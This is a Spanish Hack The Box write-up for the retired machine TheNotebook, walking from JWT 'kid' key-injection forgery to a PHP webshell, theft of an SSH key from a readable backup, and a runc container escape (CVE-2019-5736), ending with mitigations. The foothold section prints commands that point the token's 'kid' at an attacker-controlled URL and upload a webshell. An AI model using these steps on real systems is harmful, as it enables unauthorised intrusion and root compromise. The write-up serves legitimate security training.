---
machine: TheNotebook
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, jwt, docker, runc, privesc]
---

# TheNotebook — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El JWT usa `kid`, que apunta a una URL controlada por el atacante; se sirve una clave y se firma un token de administrador. El panel permite subir PHP y obtener `www-data`. `/var/backups/home.tar.gz` contiene la clave SSH de `noah`, que puede ejecutar `docker exec` como root. El Docker 18.06 usa runc vulnerable a CVE-2019-5736; desde el contenedor se sobrescribe runc y se escribe una clave en `/root/.ssh/authorized_keys`.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,10010 <IP>
```

- `22` SSH, `80` nginx y `10010` un servicio Docker.
- La web permite registrar usuarios y crear notas.
- El JWT usa `kid` para localizar la clave de verificación.

## Enumeración

- El `kid` se resuelve como ruta o URL; se puede apuntar a `http://<ATTACKER>/key`.
- La aplicación acepta `RS256` y busca la clave pública indicada por `kid`.
- El panel de administración permite subir archivos.

## Foothold

Se genera un par RSA, se sirve la clave pública y se firma un JWT con `kid` apuntando al atacante y `username=admin`. Con el token se sube un webshell PHP y se obtiene `www-data`.

```bash
python3 jwt_forge.py --kid http://<ATTACKER>/key --user admin
curl -b 'auth=<TOKEN>' -F 'file=@shell.php' http://<IP>/admin/upload.php
```

## Movimiento lateral

`/var/backups/home.tar.gz` es legible y contiene la clave privada SSH de `noah`. Al entrar por SSH, `noah` puede ejecutar como root `docker exec -it webapp-dev01*`.

```bash
tar -xzf /var/backups/home.tar.gz -C /tmp
ssh -i /tmp/home/noah/.ssh/id_rsa noah@<IP>
```

## Escalada de privilegios

Docker 18.06.0 usa runc anterior a 18.09.2, vulnerable a CVE-2019-5736. Desde el contenedor se sobrescribe `/bin/sh` con `#!/proc/self/exe` y se escribe el payload en el binario runc del host; el siguiente `docker exec` lo ejecuta como root.

```bash
docker exec -it webapp-dev01 bash
# dentro del contenedor: compilar y ejecutar el exploit de CVE-2019-5736
```

## Evidencia

- `kid` apuntando a la clave del atacante y token de administrador.
- Webshell PHP y shell como `www-data`.
- `home.tar.gz` con la clave de `noah`.
- Docker 18.06 y runc sobrescrito por CVE-2019-5736.

## Lecciones aprendidas

- Un `kid` controlable convierte la verificación JWT en una puerta abierta.
- Los backups legibles suelen contener claves privadas.
- Un Docker antiguo puede comprometer el host a través de runc.

## Mitigación y detección

- Validar `kid` contra una lista blanca y no cargar claves desde URLs.
- Proteger los backups y rotar claves tras una fuga.
- Actualizar Docker/runc y restringir `docker exec` con sudo.

## Referencias

- [0xdf — TheNotebook](https://0xdf.gitlab.io/2021/07/31/htb-thenotebook.html)
- [IppSec — TheNotebook](https://www.youtube.com/watch?v=S4FrlMTY0GY)
- [Hack The Box — TheNotebook](https://app.hackthebox.com/machines/thenotebook)
